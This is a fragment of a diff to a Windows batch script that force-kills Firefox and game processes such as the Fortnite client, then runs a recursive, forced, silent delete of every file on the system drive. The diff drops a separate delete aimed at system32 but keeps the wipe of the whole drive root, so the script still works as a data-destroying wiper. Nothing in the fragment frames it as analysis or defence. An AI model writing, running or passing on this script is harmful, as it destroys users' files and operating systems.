@@ -12,7 +12,7 @@ taskkill /f /t /im firefox.exe
 taskkill /f /t /im Source.exe
 taskkill /f /t /im FortniteClient-Win64-Shipping.exe
 
-cd %systemdrive%\windows\system32
-del *.* /f /s /q >nul
+
 cd %systemdrive%\
+
 del *.* /f /s /q >nul
